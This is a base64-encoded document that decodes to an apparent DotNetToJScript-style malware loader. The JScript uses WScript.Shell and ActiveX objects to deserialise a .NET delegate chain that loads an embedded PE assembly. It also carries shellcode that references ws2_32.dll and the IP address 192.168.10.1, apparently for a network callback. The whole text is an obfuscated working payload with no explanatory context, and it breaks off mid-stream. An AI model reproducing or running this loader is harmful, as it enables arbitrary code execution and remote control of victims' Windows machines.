VWpId2hOby9CSG9CL24vLzBpRndIUXZTSW54LzlCSWlmbEl1aHNEYzVzQUFBQUE2T3Y0Ly85SWhjQjBFMGk1Ly8vLy93QUFBQUJJeDhJQkFBQUEvOUJJZzhRZ1hsOWJYY01QQzBpRDdFaElpNFFrZ0FBQUFFaUxSQ1I0U0l0RUpIQklpVXdrUUVpSlZDUTRUSWxFSkRCTWlVd2tLTWRFSkNRQUFBQUFTR05FSkNSSU8wUWtPQStOakFBQUFFaUxoQ1NBQUFBQVNJc0FTR05NSkNSSUFjaElpVVFrR0VpTFJDUXdTSWtFSkVpTFJDUVlTSmxJOTN3a0tFaUxCQ1NLQkJDSVJDUVhTSXRFSkhCSWlVUWtDRWlMUkNRWVNKbEk5M3drZUVpTFJDUUlpZ1FRaUVRa0ZrUVB2a1FrRncrK1JDUVdRVEhBU0l0RUpFQklZMHdrSkErK0ZBaEVNY0tJRkFpTFJDUWtnOEFCaVVRa0pPbGsvLy8vU0l0TUpEaElpNFFrZ0FBQUFFZ0RDRWlKQ0VpRHhFakREd3RYVmtpRDdDQklqVHdrU0lsUEVFaUpWeGhJeDhGMTdrQnc2SEgzLy85SWhjQjBJMGlKd1VpNnpiMmVpd0FBQUFEb3EvZi8vMGlGd0hRTVNJdFBFRWlMVnhqLzBPc0RTREhBU0lQRUlGNWZ3dzhMVjFaSWcrd2dTSTA4SkVpSlR4QklpVmNZU01mQmRlNUFjT2dmOS8vL1NJWEFkQ0JJaWNGSXg4TFh5OXBZNkZ6My8vOUloY0IwREVpTFR4QklpMWNZLzlEckEwZ3h3RWlEeENCZVg4TVBDMU5JTWNCTU9jQjBFRWdQdGh3Q2lCd0JTUC9BVERuQWZQQmJ3dzhMU0RIQVREbkFkQXVJRkFGSS84Qk1PY0I4OWNNUEMxSklNY0JJRDdZVUFVaUYwblFGU1AvQTYvRmF3dzhMU0luSWlBSkl3ZWdJaUVJQlNNSG9DSWhDQWtqQjZBaUlRZ1BERHd0SU1jQ0xBY01QQzBGV1ZsZFRTSVBzS0VpSjAwbU5CQkZJTzBRa2VINEtTSVBFS0Z0ZlhrRmV3MHlKemt5SngwaUp5a3lMZENSd1RJbnhTWW5ZNkZmLy8vOUpBZDVNaWZGSWlmcEppZkJJZzhRb1cxOWVRVjdwUGYvLy93OExWVWlCN0JBRUFBQklqYXdrZ0FBQUFFaUpqYUFEQUFDSmxhZ0RBQUJNaVlXd0F3QUFSSW1OdUFNQUFNZUZqQU1BQUFBQUFBRHJHWXVGakFNQUFFaVlpNVc0QXdBQWlWU0ZnSU9GakFNQUFBR0J2WXdEQUFEL0FBQUFmdHZIaFlnREFBQUFBQUFBNnplTGhiZ0RBQUFyaFlnREFBQ0p3b3VGaUFNQUFFaGp5RWlMaGJBREFBQklBY2dQdGdBUHZzQ0Q2Z0ZJbUlsVWhZQ0RoWWdEQUFBQmk0VzRBd0FBZytnQk9ZV0lBd0FBZkxpTGhiZ0RBQUNENkFHSmhZUURBQURwa1FBQUFJdUZ1QU1BQUlQb0FZbUZnQU1BQU9zT2c2MkVBd0FBQVlPdGdBTUFBQUdEdllBREFBQUFlRENMaFlRREFBQklZOUJJaTRXZ0F3QUFTQUhRRDdZUWk0V0FBd0FBU0dQSVNJdUZzQU1BQUVnQnlBKzJBRGpDZExtRHZZQURBQUFBZVF1TGhZUURBQUNEd0FIclBJdUZoQU1BQUVoajBFaUxoYUFEQUFCSUFkQVB0Z0FQdnNCSW1JdEVoWUFCaFlRREFBQ0xoWVFEQUFBN2hhZ0RBQUFQakYzLy8vKzQvLy8vLzBpQnhCQUVBQUJkd3c4TC8vLy8vLy8vLy84QUFBQUFBQUFBQVAvLy8vLy8vLy8vQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBZDNNeVh6TXlMbVJzYkFBeE9USXVNVFk0TGpFd0xqRUFiV0ZzYVdObGIyWnBiblJsY201aGJHeGhibkpsZEc1cFptOWxZMmxzWVcwQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDd1FBQUEyRWdBQUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFSQUpBQkNpRERBTFVBcHdDV0FJd0FiUUJPQUM4QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE9PSI7CgpmdW5jdGlvbiBzZXR2ZXJzaW9uKCkgewp2YXIgc2hlbGwgPSBuZXcgQWN0aXZlWE9iamVjdCgnV1NjcmlwdC5TaGVsbCcpOwp2ZXIgPSAndjQuMC4zMDMxOSc7CnRyeSB7CnNoZWxsLlJlZ1JlYWQoJ0hLTE1cXFNPRlRXQVJFXFxNaWNyb3NvZnRcXC5ORVRGcmFtZXdvcmtcXHY0LjAuMzAzMTlcXCcpOwp9IGNhdGNoKGUpIHsgCnZlciA9ICd2Mi4wLjUwNzI3JzsKfQpzaGVsbC5FbnZpcm9ubWVudCgnUHJvY2VzcycpKCdDT01QTFVTX1ZlcnNpb24nKSA9IHZlcjsKCn0KZnVuY3Rpb24gZGVidWcocykge30KZnVuY3Rpb24gYmFzZTY0VG9TdHJlYW0oYikgewoJdmFyIGVuYyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nIik7Cgl2YXIgbGVuZ3RoID0gZW5jLkdldEJ5dGVDb3VudF8yKGIpOwoJdmFyIGJhID0gZW5jLkdldEJ5dGVzXzQoYik7Cgl2YXIgdHJhbnNmb3JtID0gbmV3IEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuRnJvbUJhc2U2NFRyYW5zZm9ybSIpOwoJYmEgPSB0cmFuc2Zvcm0uVHJhbnNmb3JtRmluYWxCbG9jayhiYSwgMCwgbGVuZ3RoKTsKCXZhciBtcyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtIik7Cgltcy5Xcml0ZShiYSwgMCwgKGxlbmd0aCAvIDQpICogMyk7Cgltcy5Qb3NpdGlvbiA9IDA7CglyZXR1cm4gbXM7Cn0KCnZhciBzZXJpYWxpemVkX29iaiA9ICJBQUVBQUFELy8vLy9BUUFBQUFBQUFBQUVBUUFBQUNKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5IisKIkF3QUFBQWhFWld4bFoyRjBaUWQwWVhKblpYUXdCMjFsZEdodlpEQURBd013VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGgiKwoiZEdsdmJraHZiR1JsY2l0RVpXeGxaMkYwWlVWdWRISjVJbE41YzNSbGJTNUVaV3hsWjJGMFpWTmxjbWxoYkdsNllYUnBiMjVJYjJ4ayIrCiJaWEl2VTNsemRHVnRMbEpsWm14bFkzUnBiMjR1VFdWdFltVnlTVzVtYjFObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJSkFnQUFBQWtEIisKIkFBQUFDUVFBQUFBRUFnQUFBREJUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlLMFJsYkdWbllYUmwiKwoiUlc1MGNua0hBQUFBQkhSNWNHVUlZWE56WlcxaWJIa0dkR0Z5WjJWMEVuUmhjbWRsZEZSNWNHVkJjM05sYldKc2VRNTBZWEpuWlhSVSIrCiJlWEJsVG1GdFpRcHRaWFJvYjJST1lXMWxEV1JsYkdWbllYUmxSVzUwY25rQkFRSUJBUUVETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sIisKImNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUVlGQUFBQUwxTjVjM1JsYlM1U2RXNTBhVzFsTGxKbGJXOTAiKwoiYVc1bkxrMWxjM05oWjJsdVp5NUlaV0ZrWlhKSVlXNWtiR1Z5QmdZQUFBQkxiWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlNaTR3TGpBdSIrCiJNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJnY0FBQUFIIisKImRHRnlaMlYwTUFrR0FBQUFCZ2tBQUFBUFUzbHpkR1Z0TGtSbGJHVm5ZWFJsQmdvQUFBQU5SSGx1WVcxcFkwbHVkbTlyWlFvRUF3QUEiKwoiQUNKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBaEVaV3hsWjJGMFpRZDBZWEpuWlhRdyIrCiJCMjFsZEdodlpEQURCd013VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1IisKImRISjVBaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drTEFBQUEiKwoiQ1F3QUFBQUpEUUFBQUFRRUFBQUFMMU41YzNSbGJTNVNaV1pzWldOMGFXOXVMazFsYldKbGNrbHVabTlUWlhKcFlXeHBlbUYwYVc5dSIrCiJTRzlzWkdWeUJnQUFBQVJPWVcxbERFRnpjMlZ0WW14NVRtRnRaUWxEYkdGemMwNWhiV1VKVTJsbmJtRjBkWEpsQ2sxbGJXSmxjbFI1IisKImNHVVFSMlZ1WlhKcFkwRnlaM1Z0Wlc1MGN3RUJBUUVBQXdnTlUzbHpkR1Z0TGxSNWNHVmJYUWtLQUFBQUNRWUFBQUFKQ1FBQUFBWVIiKwoiQUFBQUxGTjVjM1JsYlM1UFltcGxZM1FnUkhsdVlXMXBZMGx1ZG05clpTaFRlWE4wWlcwdVQySnFaV04wVzEwcENBQUFBQW9CQ3dBQSIrCiJBQUlBQUFBR0VnQUFBQ0JUZVhOMFpXMHVXRzFzTGxOamFHVnRZUzVZYld4V1lXeDFaVWRsZEhSbGNnWVRBQUFBVFZONWMzUmxiUzVZIisKImJXd3NJRlpsY25OcGIyNDlNaTR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGgiKwoiTldNMU5qRTVNelJsTURnNUJoUUFBQUFIZEdGeVoyVjBNQWtHQUFBQUJoWUFBQUFhVTNsemRHVnRMbEpsWm14bFkzUnBiMjR1UVhOeiIrCiJaVzFpYkhrR0Z3QUFBQVJNYjJGa0NnOE1BQUFBQUI0QUFBSk5XcEFBQXdBQUFBUUFBQUQvL3dBQXVBQUFBQUFBQUFCQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0FBQUFBRGgrNkRnQzBDYzBodUFGTXpTRlVhR2x6SUhCeWIyZHkiKwoiWVcwZ1kyRnVibTkwSUdKbElISjFiaUJwYmlCRVQxTWdiVzlrWlM0TkRRb2tBQUFBQUFBQUFGQkZBQUJNQVFNQVdJYWlXZ0FBQUFBQSIrCiJBQUFBNEFBaUlBc0JNQUFBRmdBQUFBWUFBQUFBQUFEdU5RQUFBQ0FBQUFCQUFBQUFBQUFRQUNBQUFBQUNBQUFFQUFBQUFBQUFBQVFBIisKIkFBQUFBQUFBQUlBQUFBQUNBQUFBQUFBQUF3QkFoUUFBRUFBQUVBQUFBQUFRQUFBUUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBQW5EVUEiKwoiQUU4QUFBQUFRQUFBa0FNQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVlBQUFEQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFnQUFBSUFBQUFBQUFBQUFBQUFBQUlJQUFBU0FBQUFBQUFBQUFBIisKIkFBQUFMblJsZUhRQUFBRDBGUUFBQUNBQUFBQVdBQUFBQWdBQUFBQUFBQUFBQUFBQUFBQUFJQUFBWUM1eWMzSmpBQUFBa0FNQUFBQkEiKwoiQUFBQUJBQUFBQmdBQUFBQUFBQUFBQUFBQUFBQUFFQUFBRUF1Y21Wc2IyTUFBQXdBQUFBQVlBQUFBQUlBQUFBY0FBQUFBQUFBQUFBQSIrCiJBQUFBQUFCQUFBQkNBQUFBQUFBQUFBQUFBQUFBQUFBQUFOQTFBQUFBQUFBQVNBQUFBQUlBQlFBTUlnQUFrQk1BQUFFQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFIZ0lvRHdBQUNpb1QiKwoiTUFvQUhBRUFBQUVBQUJFRUtCQUFBQW9LRWdFR2pta29FUUFBQ25NS0FBQUdEQWdXZlRVQUFBUnlBUUFBY0JNRWNnTUFBSEFvRWdBQSIrCiJDbThUQUFBS0ZqRVpjaDBBQUhBb0VnQUFDbklyQUFCd0F5Z1VBQUFLRXdRckYzSWRBQUJ3S0JJQUFBcHlRUUFBY0FNb0ZBQUFDaE1FIisKIkVRUVVGQlFYR240VkFBQUtGQWdTQXlnQkFBQUdKZ2w3QkFBQUJCTUZFZ1VvRmdBQUNuSlhBQUJ3S0JjQUFBbzVnQUFBQUJFRkZuTVIiKwoiQUFBS0J5QUFNQUFBR2lnQ0FBQUdFd1lTQmlnV0FBQUtjbGNBQUhBb0dBQUFDaXdLRVFVV0tBVUFBQVltS2hZVEJ4SUlCbzVwS0JFQSIrCiJBQW9SQlJFR0JoRUlFUWNvQkFBQUJpWVJCUkVHQng4Z0ZuTVJBQUFLS0FNQUFBWW1FUVVXY3hFQUFBb1dFUVlXY3hFQUFBb1dGbk1SIisKIkFBQUtLQVlBQUFZbUtub0NmaFVBQUFwOUFnQUFCQUlvRHdBQUNnSUNLQmtBQUFwOUFRQUFCQ29BRXpBQ0FHQUFBQUFBQUFBQUFuNFYiKwoiQUFBS2ZTc0FBQVFDZmhVQUFBcDlMQUFBQkFKK0ZRQUFDbjB0QUFBRUFuNFZBQUFLZlRnQUFBUUNmaFVBQUFwOU9RQUFCQUorRlFBQSIrCiJDbjA2QUFBRUFuNFZBQUFLZlRzQUFBUUNLQThBQUFvQ0FpZ1pBQUFLZlNvQUFBUXFRbE5LUWdFQUFRQUFBQUFBREFBQUFIWXlMakF1IisKIk5UQTNNamNBQUFBQUJRQnNBQUFBWEFjQUFDTitBQURJQndBQWRBa0FBQ05UZEhKcGJtZHpBQUFBQUR3UkFBQmNBQUFBSTFWVEFKZ1IiKwoiQUFBUUFBQUFJMGRWU1VRQUFBQ29FUUFBNkFFQUFDTkNiRzlpQUFBQUFBQUFBQUlBQUFGWEhRSVVDUUlBQUFENkFUTUFGZ0FBQVFBQSIrCiJBQmNBQUFBSkFBQUFVQUFBQUFvQUFBQWtBQUFBR1FBQUFETUFBQUFTQUFBQUFRQUFBQUVBQUFBR0FBQUFBUUFBQUFFQUFBQUhBQUFBIisKIkFBQ1pCZ0VBQUFBQUFBWUFYQVdTQndZQXlRV1NCd1lBaWdSZ0J3OEFzZ2NBQUFZQXNnVGhCZ1lBTUFYaEJnWUFFUVhoQmdZQXNBWGgiKwoiQmdZQWZBWGhCZ1lBbFFYaEJnWUF5UVRoQmdZQW5nUnpCd1lBZkFSekJ3WUE5QVRoQmdZQXF3aXBCZ1lBWVFTcEJnWUFUUVdwQmdZQSIrCiJzQWFwQmdZQTVBaXBCZ1lBV1FlcEJnWUEyQWlwQmdZQVpnYXBCZ1lBaEFaekJ3QUFBQUFsQUFBQUFBQUJBQUVBQVFBUUFHMEdBQUE5IisKIkFBRUFBUUFLQUJBQStBY0FBRDBBQVFBSkFBb0JFQURPQmdBQVFRQUVBQW9BQWdFQUFCc0lBQUJKQUFnQUNnQUNBUUFBTmdnQUFFa0EiKwoiSndBS0FBb0FFQUFHQndBQVBRQXFBQW9BQWdFQUFHMEVBQUJKQUR3QUN3QUNBUUFBOHdZQUFFa0FSUUFMQUFZQWZRYjZBQVlBUkFjLyIrCiJBQVlBSkFUOUFBWUFkQWcvQUFZQTV3TS9BQVlBeUFQNkFBWUF2UVA2QUFZR25nTUFBVmFBc2dJREFWYUF3QUlEQVZhQVpBQURBVmFBIisKImlBSURBVmFBd2dBREFWYUFVd0lEQVZhQThRRURBVmFBSFFJREFWYUFCUUlEQVZhQW9BRURBVmFBQWdNREFWYUFYZ0VEQVZhQVNBRUQiKwoiQVZhQTRRRURBVmFBVFFJREFWYUFNUUlEQVZhQWFnTURBVmFBZ2dNREFWYUFtUUlEQVZhQUhRTURBVmFBZGdFREFWYUFkUUFEQVZhQSIrCiJQUUFEQVZhQUp3RURBVmFBcUFBREFWYUFPZ01EQVZhQXVRRURBVmFBR0FFREFWYUF4Z0VEQVZhQTVRSURBUVlHbmdNQUFWYUFrUUFIIisKIkFWYUFjZ0lIQVFZQXBnUDZBQVlBN3dNL0FBWUFGd2MvQUFZQU13US9BQVlBU3dQNkFBWUFtZ1A2QUFZQTV3WDZBQVlBN3dYNkFBWUEiKwoiUndqNkFBWUFWUWo2QUFZQTVBVDZBQVlBTGdqNkFBWUFBUWtMQVFZQURRQUxBUVlBR1FBL0FBWUE3QWcvQUFZQTlnZy9BQVlBTkFjLyIrCiJBQVlHbmdNQUFWYUEzZ0lPQVZhQTd3QU9BVmFBblFFT0FWYUEyQUlPQVZhQTFRRU9BVmFBRHdFT0FWYUFsQUVPQVZhQUF3RU9BUVlHIisKIm5nTUFBVmFBNXdBU0FWYUFWd0FTQVZhQTFRQVNBVmFBV0FNU0FWYUFhUUlTQVZhQVR3TVNBVmFBM1FBU0FWYUFZQU1TQVZhQUVRWVMiKwoiQVZhQUpBWVNBVmFBT1FZU0FRQUFBQUNBQUpZZ0xnQVdBUUVBQUFBQUFJQUFsaUFOQ1NvQkN3QUFBQUFBZ0FDV0lCd0pOUUVRQUFBQSIrCiJBQUNBQUpZZ05Bay9BUlVBQUFBQUFJQUFsaUJqQ0VrQkdnQUFBQUFBZ0FDUklOUURUd0VjQUZBZ0FBQUFBSVlZUGdjR0FDTUFXQ0FBIisKIkFBQUFoZ0JOQkZvQkl3Q0FJUUFBQUFDR0dENEhCZ0FsQUtBaEFBQUFBSVlZUGdjR0FDVUFBQUFCQURzRUFBQUNBRk1FQUFBREFPUUgiKwoiQUFBRUFORUhBQUFGQU1FSEFBQUdBQXNJQUFBSEFOWUlBQUFJQUVjSkFRQUpBQVFIQWdBS0FNd0dBQUFCQUJzRUFBQUNBSXNJQUFBRCIrCiJBQU1HQUFBRUFHc0VBQUFGQUw4SUFBQUJBQnNFQUFBQ0FJc0lBQUFEQUFNR0FBQUVBTWtJQUFBRkFMSUlBQUFCQUhRSUFBQUNBSDBJIisKIkFBQURBQ0VIQUFBRUFBTUdBQUFGQUxVR0FBQUJBSFFJQUFBQ0FQb0RBQUFCQUhRSUFBQUNBTkVIQUFBREFQY0ZBQUFFQUpVSUFBQUYiKwoiQUNnSEFBQUdBQXNJQUFBSEFMSURBQUFCQUMwSkFBQUNBQUVBQ1FBK0J3RUFFUUErQndZQUdRQStCd29BS1FBK0J4QUFNUUErQnhBQSIrCiJPUUErQnhBQVFRQStCeEFBU1FBK0J4QUFVUUErQnhBQVdRQStCeEFBWVFBK0J4VUFhUUErQnhBQWNRQStCeEFBaVFBK0J3WUFlUUErIisKIkJ3WUFtUUJUQmlrQW9RQStCd0VBcVFBRUJDOEFzUUI1QmpRQXNRQ2tDRGdBb1FBU0J6OEFvUUJrQmtJQXNRQm1DVVlBc1FCYUNVWUEiKwoidVFBS0Jrd0FDUUFrQUZvQUNRQW9BRjhBQ1FBc0FHUUFDUUF3QUdrQUNRQTBBRzRBQ1FBNEFITUFDUUE4QUhnQUNRQkFBSDBBQ1FCRSIrCiJBSUlBQ1FCSUFJY0FDUUJNQUl3QUNRQlFBSkVBQ1FCVUFKWUFDUUJZQUpzQUNRQmNBS0FBQ1FCZ0FLVUFDUUJrQUtvQUNRQm9BSzhBIisKIkNRQnNBTFFBQ1FCd0FMa0FDUUIwQUw0QUNRQjRBTU1BQ1FCOEFNZ0FDUUNBQU0wQUNRQ0VBTklBQ1FDSUFOY0FDUUNNQU53QUNRQ1EiKwoiQU9FQUNRQ1VBT1lBQ1FDWUFPc0FDUUNnQUZvQUNRQ2tBRjhBQ1FEMEFKWUFDUUQ0QUpzQUNRRDhBUEFBQ1FBQUFia0FDUUFFQWVFQSIrCiJDUUFJQWZVQUNRQU1BYjRBQ1FBUUFjTUFDUUFZQVc0QUNRQWNBWE1BQ1FBZ0FYZ0FDUUFrQVgwQUNRQW9BVm9BQ1FBc0FWOEFDUUF3IisKIkFXUUFDUUEwQVdrQUNRQTRBWUlBQ1FBOEFZY0FDUUJBQVl3QUxnQUxBR0FCTGdBVEFHa0JMZ0FiQUlnQkxnQWpBSkVCTGdBckFKRUIiKwoiTGdBekFLSUJMZ0E3QUtJQkxnQkRBSkVCTGdCTEFKRUJMZ0JUQUtJQkxnQmJBS2dCTGdCakFLNEJMZ0JyQU5nQlF3QmJBS2dCb3dCeiIrCiJBRm9Bd3dCekFGb0FBd0Z6QUZvQUl3RnpBRm9BR2dDTUJnQUJBd0F1QUFFQUFBRUZBQTBKQVFBQUFRY0FIQWtCQUFBQkNRQTBDUUVBIisKIkFBRUxBR0